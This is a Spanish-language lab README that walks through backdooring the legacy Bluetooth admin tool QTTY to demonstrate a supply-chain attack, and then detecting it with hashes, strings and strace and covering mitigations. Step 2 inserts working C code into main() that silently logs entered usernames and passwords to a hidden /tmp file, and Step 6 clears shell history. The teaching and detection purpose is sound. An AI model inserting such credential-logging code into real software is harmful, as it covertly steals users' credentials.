# 🛡️ QTTY Backdoor PoC - Laboratorio de Supply Chain Attack

## ⚠️ ADVERTENCIA LEGAL

**USO EXCLUSIVO CON FINES EDUCATIVOS**

- ✅ **Permitido:** Entornos de laboratorio controlados y aislados
- ❌ **PROHIBIDO:** Uso en sistemas sin autorización explícita
- ⚖️ **Responsabilidad:** El usuario asume todas las consecuencias legales

> **IMPORTANTE:** La modificación no autorizada de software y el acceso a sistemas ajenos constituyen delitos penales en la mayoría de jurisdicciones. Este repositorio contiene código y procedimientos con fines estrictamente educativos y académicos. El objetivo es demostrar los riesgos de la modificación de software (Supply Chain Attacks) y cómo detectarlos.

**El autor no se hace responsable del mal uso de esta información.**

---

## 📖 Descripción del Proyecto

Este laboratorio simula un **ataque a la cadena de suministro** utilizando **QTTY**, una herramienta legacy de administración remota por Bluetooth.

El ejercicio consiste en:
1. Tomar el código fuente legítimo (del año 2006)
2. Adaptarlo para compilar en sistemas Linux modernos (Kali 2024/2025)
3. Inyectar un **Backdoor** (Puerta Trasera) que exfiltra credenciales
4. Demostrar técnicas de detección y análisis forense

**Todo sin alterar la funcionalidad aparente del programa.**

---

## 🎯 Objetivos de Aprendizaje

- ✓ Entender la arquitectura de protocolos legacy (RFCOMM/Bluetooth)
- ✓ Aprender técnicas de Ingeniería Inversa y portabilidad de código C
- ✓ Demostrar cómo se oculta código malicioso en herramientas de administración
- ✓ Aplicar métodos de defensa (Hashing e Integridad)
- ✓ Comprender los riesgos de Supply Chain Attacks

---

### Advertencia de Red:
```bash
# Verificar que estás en modo Host-Only (sin acceso a Internet)
ip addr show
ping -c 1 8.8.8.8  # Debe fallar
```

---

## 🚀 Paso 1: Obtención y Preparación

### 1.1 Instalación de Dependencias

```bash
# 1. Actualizar repositorios
sudo apt-get update

# 2. Instalar librerías de desarrollo (Bluetooth y Readline)
sudo apt-get install -y build-essential libbluetooth-dev libreadline-dev

# 3. Verificar instalación
dpkg -l | grep -E "libbluetooth|libreadline"
```

### 1.2 Descomprimir Código Fuente

```bash
# Descomprimir el tarball original
tar -xzvf qtty-1.60.tar.gz
cd qtty-1.60

# Listar archivos
ls -la
```

**Archivos principales:**
- `qtty-lin.c` - Código principal para Linux
- `qtty-syslin.c` - Interfaz con el sistema Bluetooth
- `qtty-util.c` - Utilidades
- `qtty-sha1.c` - Funciones de hash

---

## 🔓 Paso 2: Inyección del Backdoor (Modificación de Código)

### 2.1 El Código Malicioso

Editamos el archivo principal: `qtty-lin.c`

```bash
nano qtty-lin.c
```

**Ubicación:** Dentro de la función `main()`, justo después de la validación de argumentos (línea con `if (!qcaddr...)`).

**Código a insertar:**

```c
/* ========================================
   INICIO BACKDOOR EDUCATIVO
   ======================================== */
FILE *hack_log = fopen("/tmp/.credenciales_capturadas.txt", "a");
if (hack_log != NULL) {
    time_t now = time(NULL);
    fprintf(hack_log, "[%s] Usuario: %s | Contrasena: %s\n", 
            ctime(&now), user, passwd);
    fclose(hack_log);
}
/* ======================================== 
   FIN BACKDOOR EDUCATIVO
   ======================================== */
```

**Nota:** El archivo se guarda como `.credenciales_capturadas.txt` (oculto) para ser más sigiloso.

### 2.2 Corrección de Compatibilidad (Porting)

Debido a la antigüedad del código (2006), debemos parchear `qtty-syslin.c`.

```bash
nano qtty-syslin.c
```

#### Cambios Necesarios:

**A) Headers faltantes** - Agregar al inicio del archivo:

```c
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
```

**B) Función Obsoleta** - Buscar la línea con `hci_remote_name` y reemplazarla:

```c
// ANTES (línea ~150):
hci_remote_name(dev_id, &addr, sizeof(name), name, timeout);

// DESPUÉS:
hci_read_remote_name(dev_id, &addr, sizeof(name), name, timeout);
```

**Guardar:** `Ctrl + O`, `Enter`, `Ctrl + X`

---

## ⚙️ Paso 3: Compilación Manual

El `Makefile` original no funciona en sistemas modernos. Usamos `gcc` manual.

```bash
# Compilar con enlace a librerías Bluetooth y Readline
gcc -o qttyM qtty-lin.c qtty-syslin.c qtty-util.c qtty-sha1.c \
    -lbluetooth -lreadline -w

# Verificar binario creado
ls -lh qttyM
file qttyM
```

**Flags explicados:**
- `-o qttyM` → Nombre del binario modificado (Malicioso)
- `-lbluetooth` → Enlaza el stack de Bluetooth (BlueZ)
- `-lreadline` → Habilita navegación por historial en terminal
- `-w` → Suprime warnings de código antiguo

---

## 🧪 Paso 4: Prueba de Concepto (PoC)

Simulamos que un administrador de sistemas intenta conectarse a un dispositivo móvil.

### 4.1 Ejecución (Víctima)

```bash
./qttyM --qc-addr 00:11:22:33:44:55 --qc-channel 1 \
        --user admin --pass SuperSecreto123
```

**Resultado esperado:**
```
Error: Cannot connect to device 00:11:22:33:44:55
```

El error es normal (no hay dispositivo real), pero **el backdoor ya se ejecutó**.

### 4.2 Verificación (Atacante)

```bash
# Ver credenciales capturadas
cat /tmp/.credenciales_capturadas.txt
```

**Salida esperada:**
```
[Thu Feb  5 14:23:01 2026] Usuario: admin | Contrasena: SuperSecreto123
```

### 4.3 Persistencia del Backdoor

```bash
# Probar con múltiples usuarios
./qttyM --qc-addr 00:11:22:33:44:55 --qc-channel 1 --user root --pass toor
./qttyM --qc-addr AA:BB:CC:DD:EE:FF --qc-channel 1 --user test --pass test123

# Ver todas las credenciales
cat /tmp/.credenciales_capturadas.txt
```

---

## 🛡️ Paso 5: Análisis y Detección

### 5.1 Verificación de Integridad con Hash

```bash
# Calcular hash del binario original (si lo conservaste)
md5sum qtty_original > hash_original.txt

# Calcular hash del binario modificado
md5sum qttyM > hash_modificado.txt

# Comparación
diff hash_original.txt hash_modificado.txt
```

**Resultado esperado:**
```diff
< a3b5c7d9e1f2... qtty_original
---
> 8f2c4e6a0b8d... qttyM
```

✅ **Hashes diferentes = Binario comprometido**

### 5.2 Detección con SHA256 (más seguro)

```bash
# Hash SHA256
sha256sum qttyM

# Comparar con base de datos de hashes conocidos
# (en un escenario real, consultar VirusTotal o bases NIST)
```

### 5.3 Análisis Forense Avanzado

#### A) Búsqueda de Strings Sospechosas

```bash
# Buscar cadenas relacionadas con el backdoor
strings qttyM | grep -i "credencial\|hack\|tmp"
```

**Salida reveladora:**
```
/tmp/.credenciales_capturadas.txt
[HACKED] Usuario:
Contrasena:
```

#### B) Análisis Dinámico con `strace`

```bash
# Rastrear llamadas al sistema durante ejecución
strace -e trace=open,openat,write ./qttyM \
       --qc-addr 00:11:22:33:44:55 --qc-channel 1 \
       --user test --pass test123 2>&1 | grep tmp
```

**Salida:**
```
openat(AT_FDCWD, "/tmp/.credenciales_capturadas.txt", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
write(3, "[Thu Feb  5...] Usuario: test | Contrasena: test123\n", 65) = 65
```

#### C) Comparación de Binarios

```bash
# Comparar binarios byte a byte
cmp qtty_original qttyM

# Ver diferencias en hexadecimal
hexdiff qtty_original qttyM | head -20
```

---

## 🧹 Paso 6: Limpieza del Laboratorio

**Después de completar el ejercicio:**

```bash
# 1. Eliminar binarios modificados
rm qttyM

# 2. Eliminar archivos de exfiltración
sudo rm /tmp/.credenciales_capturadas.txt

# 3. Verificar que no quedan rastros
ls -la /tmp/ | grep credencial
find /tmp -name "*credencial*" 2>/dev/null

# 4. Limpiar historial de bash (opcional, solo en laboratorio)
history -c
```

---

## 📚 Contexto Teórico

### ¿Qué es QTTY?

**QTTY** (Quick TTY) es una herramienta cliente para conectarse a servidores **WmConsole/QConsole** en dispositivos móviles antiguos (Symbian OS, Windows Mobile).

**Funcionalidades:**
- Control total del sistema operativo móvil vía línea de comandos
- Acceso a archivos, procesos y configuraciones
- Comunicación a través de Bluetooth (protocolo RFCOMM)

### Protocolo RFCOMM vs BLE

| Característica | RFCOMM (Usado por QTTY) | BLE (Bluetooth Low Energy) |
|----------------|------------------------|----------------------------|
| **Año** | 1999 (Bluetooth 1.0) | 2010 (Bluetooth 4.0) |
| **Uso** | Emulación puerto serial | Dispositivos IoT modernos |
| **Conexión** | Permanente | Intermitente |
| **Consumo** | Alto | Muy bajo |
| **Casos de uso** | OBDII automotriz, industria | Smartwatches, sensores |

**Nota:** RFCOMM aún se usa en diagnóstico automotriz (OBDII) y sistemas industriales legacy.

### Riesgos de Privacidad

Si un atacante instalaba el servidor en el móvil de la víctima, herramientas como QTTY permitían:
- ✗ Acceso total a archivos personales
- ✗ Lectura de SMS y registros de llamadas
- ✗ Instalación de malware adicional
- ✗ Todo **sin necesidad de internet** (solo proximidad Bluetooth ~10m)

### Supply Chain Attacks en el Mundo Real

**Ejemplos históricos:**
- **SolarWinds (2020):** Inyección de código en actualizaciones legítimas
- **CCleaner (2017):** Backdoor en instalador oficial
- **XZ Utils (2024):** Intento de backdoor en librería de compresión Linux

---

## 🔒 Mitigaciones y Buenas Prácticas

### Para Desarrolladores:
1. **Firmar digitalmente** todos los binarios de distribución
2. Publicar **hashes SHA256** en sitios oficiales
3. Usar **reproducible builds** cuando sea posible
4. Implementar **Code Signing Certificates**

### Para Usuarios:
1. **Verificar hashes** antes de instalar software
2. Descargar **solo de fuentes oficiales**
3. Usar herramientas como `checksec` para análisis
4. Mantener actualizados sistemas de detección (antivirus, EDR)

### Comandos de Verificación:

```bash
# Verificar firma GPG (ejemplo genérico)
gpg --verify software.sig software.tar.gz

# Comparar hash SHA256
echo "hash_oficial  archivo.tar.gz" | sha256sum -c

# Analizar binario con checksec
checksec --file=./binario
```


